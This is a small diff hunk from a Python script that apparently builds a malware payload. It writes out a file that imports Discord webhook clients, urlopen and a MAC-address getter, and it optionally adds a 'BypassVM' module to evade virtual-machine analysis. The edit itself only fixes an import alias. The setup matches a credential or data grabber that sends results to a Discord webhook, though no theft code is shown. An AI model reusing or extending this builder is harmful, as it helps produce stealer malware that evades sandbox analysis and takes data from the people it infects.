@@ -53,7 +53,7 @@ from re import findall, match
 from urllib.request import urlopen
 from discord import File, Webhook, RequestsWebhookAdapter
 from discord_webhook import DiscordWebhook, DiscordEmbed
-from getmac import get_mac_address as """)
+from getmac import get_mac_address as gma""")
             if self.bypassVM == "y":
                 f.write("import BypassVM\n")
                 f.write("\nbypass = BypassVM.BypassVM()\n")
